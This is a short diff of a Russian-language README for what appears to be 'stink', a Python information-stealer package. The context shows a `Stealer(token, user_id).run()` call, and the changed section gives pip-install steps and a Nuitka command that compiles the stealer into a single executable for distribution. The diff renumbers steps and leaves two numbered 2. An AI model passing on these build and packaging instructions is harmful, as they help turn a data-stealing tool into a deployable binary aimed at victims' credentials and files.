@@ -123,15 +123,16 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
 ### PyCharm
-1. Устанавливаем Nuitka и Stink:
+1. Открываем терминал.
+2. Устанавливаем Nuitka и Stink:
 ```
 pip install Nuitka==0.6.16.4
 ```
 ```
 pip install stink==0.0.3
 ```
-2. Открываем терминал и прописываем команду:
-```python
+2. Прописываем команду:
+```
 nuitka --onefile --include-package=stink test.py
 ```
 
